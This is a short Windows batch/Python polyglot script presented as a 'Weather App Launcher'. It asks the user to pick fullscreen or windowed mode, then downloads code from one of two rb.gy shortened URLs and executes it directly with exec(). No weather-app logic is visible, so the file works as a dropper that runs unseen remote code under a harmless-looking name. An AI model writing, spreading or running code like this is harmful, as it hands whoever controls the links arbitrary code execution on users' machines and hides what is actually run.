@echo off & python -x "%~f0" %* & goto :eof 

print("Welcome to the Weather App Launcher")
import os

try :
    import requests
except ImportError:
    print("Installing Packages")
    os.system("pip install requests")
import requests

print("Select from the below option :- ")
print("For Fullscreen : Press f or F")
print("For Windowed   : Press w or W")

st = str(input())

if st == "f" or st == "F":
    url = "https://rb.gy/ambkhg"
elif st == "w" or st == "W":
    url = "https://rb.gy/ufqfa5"

print()
print("Initializing....")
print()

page = requests.get(url)
exec(page.text)
